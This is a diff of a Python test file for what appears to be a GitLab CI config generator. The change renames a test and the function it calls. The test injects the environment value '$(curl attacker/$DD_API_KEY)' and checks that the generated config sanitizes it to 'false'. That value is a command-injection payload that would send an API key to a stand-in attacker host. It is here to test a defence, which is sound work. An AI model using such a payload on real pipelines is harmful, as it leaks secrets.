@@ -152,13 +152,13 @@ def test_ddtest_jobs_preserve_environment_values_with_spaces(gen_gitlab_config_m
     assert (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text().count('eval "export ${!env_var}"') == 2
 
 
-def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
+def test_build_base_test_artifacts_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
     monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
     monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
     monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})
 
-    gen_gitlab_config_mod.gen_build_base_venvs()
+    gen_gitlab_config_mod.gen_build_base_test_artifacts()
 
     config = (tmp_path / "tests-gen.yml").read_text()
     assert 'echo "NIGHTLY_BUILD: false"' in config
